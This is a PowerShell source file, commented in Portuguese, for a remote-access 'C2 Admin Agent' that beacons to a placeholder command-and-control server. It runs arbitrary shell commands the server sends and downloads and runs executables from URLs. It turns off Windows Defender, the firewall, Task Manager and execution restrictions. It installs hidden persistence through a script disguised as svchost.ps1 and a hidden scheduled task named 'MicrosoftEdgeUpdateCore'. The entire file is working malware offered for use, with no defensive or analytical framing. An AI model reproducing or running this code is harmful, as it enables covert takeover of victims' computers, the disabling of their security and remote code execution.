# C2 Admin Agent - PowerShell Version
# Funciona em TODOS os Windows 10/11 sem precisar instalar Python!

# Configurações (serão substituídas pelo servidor)
$SERVER_URL = "SERVER_URL_PLACEHOLDER"
$SECRET_TOKEN = "SECRET_TOKEN_PLACEHOLDER"

# Classe do Agente
class AdminAgent {
    [string]$ClientId
    [string]$Hostname
    [string]$Username
    [string]$OSVersion
    [string]$ServerUrl
    [string]$Token
    [int]$CheckinInterval

    AdminAgent([string]$serverUrl, [string]$token) {
        $this.ServerUrl = $serverUrl
        $this.Token = $token
        $this.CheckinInterval = 1
        $this.ClientId = $this.GenerateClientId()
        $this.Hostname = $env:COMPUTERNAME
        $this.Username = $env:USERNAME
        $this.OSVersion = $this.GetOSVersion()

        # EXECUTAR AUTOMATICAMENTE ao conectar
        $this.AutoRemoveRestrictions()

        # Criar persistência
        $this.CreatePersistence()
    }
    
    [string] GenerateClientId() {
        # Gerar ID único baseado no hardware
        try {
            $uuid = (Get-WmiObject -Class Win32_ComputerSystemProduct).UUID
            $md5 = [System.Security.Cryptography.MD5]::Create()
            $hash = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($uuid))
            return [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
        } catch {
            # Fallback: usar hostname
            $md5 = [System.Security.Cryptography.MD5]::Create()
            $hash = $md5.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($env:COMPUTERNAME))
            return [System.BitConverter]::ToString($hash).Replace("-", "").ToLower()
        }
    }
    
    [string] GetOSVersion() {
        try {
            $os = Get-WmiObject -Class Win32_OperatingSystem
            return "$($os.Caption) $($os.Version)"
        } catch {
            return "Windows Unknown"
        }
    }
    
    [object] SendRequest([string]$endpoint, [hashtable]$data) {
        try {
            $url = "$($this.ServerUrl)$endpoint"

            if ($data) {
                $data['token'] = $this.Token
                $jsonData = $data | ConvertTo-Json -Compress

                $response = Invoke-RestMethod -Uri $url -Method Post `
                    -Body $jsonData -ContentType "application/json" `
                    -TimeoutSec 10 -ErrorAction Stop
            } else {
                $response = Invoke-RestMethod -Uri $url -Method Get `
                    -TimeoutSec 10 -ErrorAction Stop
            }

            return $response
        } catch {
            Write-Host "[!] Erro na requisição: $_"
            return $null
        }
    }
    
    [object] Checkin() {
        $data = @{
            client_id = $this.ClientId
            hostname = $this.Hostname
            username = $this.Username
            os_version = $this.OSVersion
        }

        $response = $this.SendRequest('/api/checkin', $data)

        # Retorna comando único ou null
        if ($response -and $response.command) {
            return @{
                id = $response.command_id
                type = $response.command.type
                params = $response.command.params
            }
        }
        return $null
    }
    
    [void] ExecuteCommand([object]$command) {
        $cmdType = $command.type
        $params = $command.params
        $cmdId = $command.id

        Write-Host "[DEBUG] Executando comando tipo: $cmdType | ID: $cmdId"

        $result = ""

        try {
            switch ($cmdType) {
                'shell' {
                    if ($params -and $params.cmd) {
                        Write-Host "[DEBUG] Shell command: $($params.cmd)"
                        $result = $this.RunShell($params.cmd)
                        Write-Host "[DEBUG] Shell result length: $($result.Length)"
                    } else {
                        $result = "Erro: Parâmetro 'cmd' não fornecido"
                    }
                }
                'remove_restrictions' {
                    $result = $this.RemoveRestrictions()
                }
                'enable_execution' {
                    $result = $this.EnableExecution()
                }
                'remove_proxy' {
                    $result = $this.RemoveProxyRestrictions()
                }
                'get_info' {
                    $result = $this.GetSystemInfo()
                }
                'download_execute' {
                    if ($params -and $params.url) {
                        $result = $this.DownloadAndExecute($params.url)
                    }
                }
                'disable_defender' {
                    $result = $this.DisableWindowsDefender()
                }
                'disable_firewall' {
                    $result = $this.DisableFirewall()
                }
                'disable_all' {
                    $result = $this.DisableAllProtections()
                }
                default {
                    $result = "Comando desconhecido: $cmdType"
                }
            }
        } catch {
            $result = "Erro ao executar: $_"
            Write-Host "[DEBUG] Erro: $_"
        }

        Write-Host "[DEBUG] Enviando resultado (length: $($result.Length))"
        $this.SendResult($cmdId, $command, $result)
    }
    
    [void] SendResult([string]$cmdId, [object]$command, [string]$result) {
        Write-Host "[DEBUG] SendResult - cmdId: $cmdId | result length: $($result.Length)"

        $data = @{
            client_id = $this.ClientId
            command_id = $cmdId
            result = $result
        }

        $response = $this.SendRequest('/api/result', $data)
        Write-Host "[DEBUG] SendResult response: $($response | ConvertTo-Json -Compress)"
    }

    [string] RunShell([string]$cmd) {
        try {
            # Executar comando com TIMEOUT de 10 segundos
            $job = Start-Job -ScriptBlock {
                param($command)
                Invoke-Expression $command 2>&1 | Out-String -Width 200
            } -ArgumentList $cmd

            # Aguardar até 10 segundos
            $completed = Wait-Job -Job $job -Timeout 10

            if ($completed) {
                $output = Receive-Job -Job $job
                Remove-Job -Job $job -Force

                if ([string]::IsNullOrWhiteSpace($output)) {
                    return "[Comando executado sem saída]"
                }
                return $output
            } else {
                # Timeout - matar job
                Stop-Job -Job $job
                Remove-Job -Job $job -Force
                return "[TIMEOUT] Comando demorou mais de 10 segundos. Use comandos com parâmetros (ex: 'nslookup google.com' ao invés de só 'nslookup')"
            }
        } catch {
            return "Erro ao executar comando: $_"
        }
    }

    [string] RemoveRestrictions() {
        $commands = @(
            'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /t REG_DWORD /d 0 /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun" /f',
            'reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /f'
        )

        $results = @()
        foreach ($cmd in $commands) {
            try {
                $output = cmd /c $cmd 2>&1
                $results += "$($cmd.Substring(0, [Math]::Min(50, $cmd.Length)))... -> OK"
            } catch {
                $results += "$($cmd.Substring(0, [Math]::Min(50, $cmd.Length)))... -> Erro: $_"
            }
        }

        return $results -join "`n"
    }

    [string] EnableExecution() {
        $commands = @(
            'reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "DisallowRun" /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "RestrictRun" /f'
        )

        $results = @()
        foreach ($cmd in $commands) {
            try {
                $output = cmd /c $cmd 2>&1
                $results += "OK"
            } catch {
                $results += "Erro: $_"
            }
        }

        # Habilitar PowerShell
        try {
            Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force
            $results += "PowerShell habilitado"
        } catch {
            $results += "Erro ao habilitar PowerShell: $_"
        }

        return "Execução habilitada:`n" + ($results -join "`n")
    }

    [string] RemoveProxyRestrictions() {
        $commands = @(
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyEnable" /f',
            'reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings" /v "ProxyServer" /f',
            'reg delete "HKCU\Software\Policies\Microsoft\Internet Explorer\Control Panel" /v "HomePage" /f',
            'reg delete "HKCU\Software\Policies\Microsoft\Internet Explorer\Restrictions" /f'
        )

        $results = @()
        foreach ($cmd in $commands) {
            try {
                $output = cmd /c $cmd 2>&1
                $results += "OK"
            } catch {
                $results += "Erro: $_"
            }
        }

        return "Restrições de navegação removidas:`n" + ($results -join "`n")
    }

    [string] DisableWindowsDefender() {
        $results = @()
        $results += "=" * 60
        $results += "DESATIVANDO WINDOWS DEFENDER"
        $results += "=" * 60

        # Método 1: PowerShell cmdlets
        try {
            Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
            $results += "✅ Proteção em tempo real desativada"
        } catch {
            $results += "❌ Proteção em tempo real: $_"
        }

        try {
            Set-MpPreference -MAPSReporting 0 -ErrorAction Stop
            $results += "✅ Proteção na nuvem desativada"
        } catch {
            $results += "❌ Proteção na nuvem: $_"
        }

        try {
            Set-MpPreference -SubmitSamplesConsent 2 -ErrorAction Stop
            $results += "✅ Envio de amostras desativado"
        } catch {
            $results += "❌ Envio de amostras: $_"
        }

        try {
            Set-MpPreference -DisableBehaviorMonitoring $true -ErrorAction Stop
            $results += "✅ Monitoramento de comportamento desativado"
        } catch {
            $results += "❌ Monitoramento de comportamento: $_"
        }

        # Método 2: Registro do Windows
        $regCommands = @(
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d 1 /f',
            'reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d 1 /f'
        )

        foreach ($cmd in $regCommands) {
            try {
                cmd /c $cmd 2>&1 | Out-Null
                $results += "✅ Registro modificado"
            } catch {
                $results += "❌ Erro no registro: $_"
            }
        }

        # Método 3: Desabilitar serviço
        try {
            Stop-Service -Name WinDefend -Force -ErrorAction Stop
            Set-Service -Name WinDefend -StartupType Disabled -ErrorAction Stop
            $results += "✅ Serviço Windows Defender parado e desabilitado"
        } catch {
            $results += "❌ Serviço Windows Defender: $_"
        }

        $results += "=" * 60
        return $results -join "`n"
    }

    [string] DisableFirewall() {
        $results = @()
        $results += "=" * 60
        $results += "DESATIVANDO FIREWALL DO WINDOWS"
        $results += "=" * 60

        # Método 1: netsh
        try {
            $output = cmd /c 'netsh advfirewall set allprofiles state off' 2>&1
            $results += "✅ Firewall desativado via netsh"
            $results += "   $output"
        } catch {
            $results += "❌ Erro ao desativar via netsh: $_"
        }

        # Método 2: PowerShell
        try {
            Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False -ErrorAction Stop
            $results += "✅ Firewall desativado via PowerShell (todos os perfis)"
        } catch {
            $results += "❌ Erro ao desativar via PowerShell: $_"
        }

        # Método 3: Registro
        $regCommands = @(
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\DomainProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f',
            'reg add "HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\PublicProfile" /v "EnableFirewall" /t REG_DWORD /d 0 /f'
        )

        foreach ($cmd in $regCommands) {
            try {
                cmd /c $cmd 2>&1 | Out-Null
                $results += "✅ Registro modificado"
            } catch {
                $results += "❌ Erro no registro: $_"
            }
        }

        # Método 4: Desabilitar serviço
        try {
            Stop-Service -Name mpssvc -Force -ErrorAction Stop
            Set-Service -Name mpssvc -StartupType Disabled -ErrorAction Stop
            $results += "✅ Serviço de Firewall parado e desabilitado"
        } catch {
            $results += "❌ Serviço de Firewall: $_"
        }

        $results += "=" * 60
        return $results -join "`n"
    }

    [string] DisableAllProtections() {
        $results = @()
        $results += "=" * 60
        $results += "INICIANDO DESATIVAÇÃO COMPLETA DE PROTEÇÕES"
        $results += "=" * 60

        $results += "`n[1/4] Desativando Windows Defender..."
        $results += $this.DisableWindowsDefender()

        $results += "`n[2/4] Desativando Firewall..."
        $results += $this.DisableFirewall()

        $results += "`n[3/4] Removendo restrições de execução..."
        $results += $this.RemoveRestrictions()

        $results += "`n[4/4] Habilitando execução de programas..."
        $results += $this.EnableExecution()

        $results += "`n" + ("=" * 60)
        $results += "✅ TODAS AS PROTEÇÕES DESATIVADAS COM SUCESSO!"
        $results += "=" * 60

        return $results -join "`n"
    }

    [string] GetSystemInfo() {
        $output = @()
        $output += "=" * 80
        $output += "              INFORMAÇÕES COMPLETAS DO SISTEMA"
        $output += "=" * 80

        # Sistema Operacional
        try {
            $os = Get-WmiObject Win32_OperatingSystem
            $output += ""
            $output += "🖥️  SISTEMA OPERACIONAL:"
            $output += "  Nome: $($os.Caption)"
            $output += "  Versão: $($os.Version)"
            $output += "  Build: $($os.BuildNumber)"
            $output += "  Arquitetura: $($os.OSArchitecture)"
        } catch {}

        # Informações básicas
        $output += ""
        $output += "💻 COMPUTADOR:"
        $output += "  Hostname: $($this.Hostname)"
        $output += "  Usuário: $($this.Username)"

        # Fabricante
        try {
            $cs = Get-WmiObject Win32_ComputerSystem
            $output += "  Fabricante: $($cs.Manufacturer)"
            $output += "  Modelo: $($cs.Model)"
        } catch {}

        # Placa-Mãe
        try {
            $mb = Get-WmiObject Win32_BaseBoard
            $output += ""
            $output += "🔧 PLACA-MÃE:"
            $output += "  Fabricante: $($mb.Manufacturer)"
            $output += "  Modelo: $($mb.Product)"
        } catch {}

        # Processador
        try {
            $cpu = Get-WmiObject Win32_Processor | Select-Object -First 1
            $output += ""
            $output += "⚡ PROCESSADOR:"
            $output += "  Nome: $($cpu.Name.Trim())"
            $output += "  Núcleos: $($cpu.NumberOfCores)"
            $output += "  Threads: $($cpu.NumberOfLogicalProcessors)"
            $output += "  Velocidade: $($cpu.MaxClockSpeed) MHz"
        } catch {}

        # Memória RAM
        try {
            $cs = Get-WmiObject Win32_ComputerSystem
            $totalRAM = [Math]::Round($cs.TotalPhysicalMemory / 1GB, 2)
            $output += ""
            $output += "💾 MEMÓRIA RAM:"
            $output += "  Total: $totalRAM GB"

            # Módulos de RAM
            $ramModules = Get-WmiObject Win32_PhysicalMemory
            if ($ramModules) {
                $output += "  Módulos:"
                foreach ($module in $ramModules) {
                    $size = [Math]::Round($module.Capacity / 1GB, 2)
                    $speed = $module.Speed
                    $output += "    - $size GB @ $speed MHz"
                }
            }
        } catch {}

        # Placa de Vídeo
        try {
            $gpus = Get-WmiObject Win32_VideoController
            $output += ""
            $output += "🎮 PLACA(S) DE VÍDEO:"
            foreach ($gpu in $gpus) {
                $vram = [Math]::Round($gpu.AdapterRAM / 1GB, 2)
                $output += "  Nome: $($gpu.Name)"
                if ($vram -gt 0) {
                    $output += "  VRAM: $vram GB"
                }
                $output += "  Resolução: $($gpu.CurrentHorizontalResolution) x $($gpu.CurrentVerticalResolution)"
            }
        } catch {}

        # Discos
        try {
            $drives = Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DriveType -eq 3}
            $output += ""
            $output += "💿 DISCOS:"
            foreach ($drive in $drives) {
                $total = [Math]::Round($drive.Size / 1GB, 2)
                $free = [Math]::Round($drive.FreeSpace / 1GB, 2)
                $used = $total - $free
                $percent = [Math]::Round(($used / $total) * 100, 1)
                $volName = if ($drive.VolumeName) { "($($drive.VolumeName))" } else { "" }
                $output += "  $($drive.DeviceID) $volName"
                $output += "    Total: ${total}GB | Usado: ${used}GB (${percent}%) | Livre: ${free}GB"
            }
        } catch {}

        # Rede
        try {
            $ips = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne '127.0.0.1'}).IPAddress
            $output += ""
            $output += "🌐 REDE:"
            foreach ($ip in $ips) {
                $output += "  IP: $ip"
            }
        } catch {}

        # Antivírus
        try {
            $av = Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction SilentlyContinue
            $output += ""
            $output += "🛡️  ANTIVÍRUS:"
            if ($av) {
                foreach ($a in $av) {
                    $output += "  - $($a.displayName)"
                }
            } else {
                $output += "  Nenhum detectado"
            }
        } catch {
            $output += ""
            $output += "🛡️  ANTIVÍRUS: Nenhum detectado"
        }

        # Firewall
        try {
            $fw = Get-NetFirewallProfile | Select-Object Name, Enabled
            $output += ""
            $output += "🔥 FIREWALL:"
            foreach ($f in $fw) {
                $status = if ($f.Enabled) { "✅ ATIVADO" } else { "❌ DESATIVADO" }
                $output += "  $($f.Name): $status"
            }
        } catch {}

        $output += ""
        $output += "=" * 80

        return $output -join "`n"
    }

    [string] DownloadAndExecute([string]$url) {
        try {
            $tempFile = Join-Path $env:TEMP "temp_exec.exe"
            Invoke-WebRequest -Uri $url -OutFile $tempFile -TimeoutSec 30
            Start-Process $tempFile
            return "Arquivo baixado e executado: $tempFile"
        } catch {
            return "Erro ao baixar/executar: $_"
        }
    }

    [void] AutoRemoveRestrictions() {
        try {
            Write-Host "[*] Removendo restrições automaticamente..."

            $this.RemoveRestrictions() | Out-Null
            Write-Host "[✓] Restrições de execução removidas"

            $this.EnableExecution() | Out-Null
            Write-Host "[✓] Execução de programas habilitada"

            $this.RemoveProxyRestrictions() | Out-Null
            Write-Host "[✓] Restrições de navegação removidas"

            Write-Host "[✓] Todas as restrições removidas automaticamente!"
        } catch {
            Write-Host "[!] Erro ao remover restrições: $_"
        }
    }

    [void] CreatePersistence() {
        try {
            # Tentar múltiplos locais (do mais oculto ao mais acessível)
            $possiblePaths = @(
                "$env:APPDATA\Microsoft\Windows\Themes\svchost.ps1",
                "$env:LOCALAPPDATA\Microsoft\Windows\Caches\svchost.ps1",
                "$env:TEMP\WindowsUpdateCheck.ps1",
                "$env:USERPROFILE\Documents\WindowsUpdate.ps1"
            )

            $scriptPath = $null
            foreach ($path in $possiblePaths) {
                try {
                    $scriptDir = Split-Path $path -Parent
                    if (-not (Test-Path $scriptDir)) {
                        New-Item -ItemType Directory -Path $scriptDir -Force -ErrorAction Stop | Out-Null
                    }
                    # Testar se consegue escrever
                    "test" | Out-File -FilePath $path -Force -ErrorAction Stop
                    Remove-Item $path -Force -ErrorAction SilentlyContinue
                    $scriptPath = $path
                    break
                } catch {
                    continue
                }
            }

            if (-not $scriptPath) {
                Write-Host "[!] Não foi possível criar persistência - sem permissões"
                return
            }

            # Script simplificado para persistência
            $persistScript = @"
while (`$true) {
    try {
        `$data = @{
            client_id = "$($this.ClientId)"
            hostname = `$env:COMPUTERNAME
            username = `$env:USERNAME
            os_version = "$($this.OSVersion)"
        }
        `$headers = @{
            "Authorization" = "Bearer $($this.Token)"
            "Content-Type" = "application/json"
        }
        `$body = `$data | ConvertTo-Json
        `$response = Invoke-RestMethod -Uri "$($this.ServerUrl)/api/checkin" -Method Post -Headers `$headers -Body `$body -UseBasicParsing

        if (`$response.commands) {
            foreach (`$cmd in `$response.commands) {
                `$result = ""
                if (`$cmd.type -eq "shell" -and `$cmd.params.cmd) {
                    try {
                        `$result = cmd /c `$cmd.params.cmd 2>&1 | Out-String
                    } catch {
                        `$result = "Erro: `$_"
                    }
                    `$resultData = @{
                        client_id = "$($this.ClientId)"
                        command_id = `$cmd.id
                        result = `$result
                    }
                    `$resultBody = `$resultData | ConvertTo-Json
                    Invoke-RestMethod -Uri "$($this.ServerUrl)/api/result" -Method Post -Headers `$headers -Body `$resultBody -UseBasicParsing | Out-Null
                }
            }
        }
        Start-Sleep -Seconds 2
    } catch {
        Start-Sleep -Seconds 2
    }
}
"@

            $persistScript | Out-File -FilePath $scriptPath -Encoding UTF8 -Force

            # Tentar ocultar arquivo (não crítico se falhar)
            try {
                (Get-Item $scriptPath -Force).Attributes = 'Hidden,System'
            } catch {}

            # Criar tarefa agendada
            $taskName = "MicrosoftEdgeUpdateCore"

            # Remover tarefa antiga se existir
            try {
                Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
            } catch {}

            $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`""
            $trigger = New-ScheduledTaskTrigger -AtStartup
            $principal = New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType S4U -RunLevel Highest
            $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Force | Out-Null

            Write-Host "[✓] Persistência criada em: $scriptPath"
        } catch {
            Write-Host "[!] Erro ao criar persistência: $_"
        }
    }

    [void] Run() {
        Write-Host "[*] Agente iniciado - ID: $($this.ClientId)"
        Write-Host "[*] Servidor: $($this.ServerUrl)"
        Write-Host "[*] Intervalo de checkin: $($this.CheckinInterval)s"

        while ($true) {
            try {
                # Fazer checkin
                $command = $this.Checkin()

                if ($command) {
                    Write-Host "[*] Executando comando: $($command.type) | ID: $($command.id)"
                    $this.ExecuteCommand($command)
                }

                # Aguardar próximo checkin
                Start-Sleep -Seconds $this.CheckinInterval

            } catch {
                Write-Host "[!] Erro no loop principal: $_"
                Start-Sleep -Seconds $this.CheckinInterval
            }
        }
    }
}

# Executar agente
try {
    $agent = [AdminAgent]::new($SERVER_URL, $SECRET_TOKEN)
    $agent.Run()
} catch {
    Write-Host "[!] Erro fatal: $_"
    Start-Sleep -Seconds 5
}

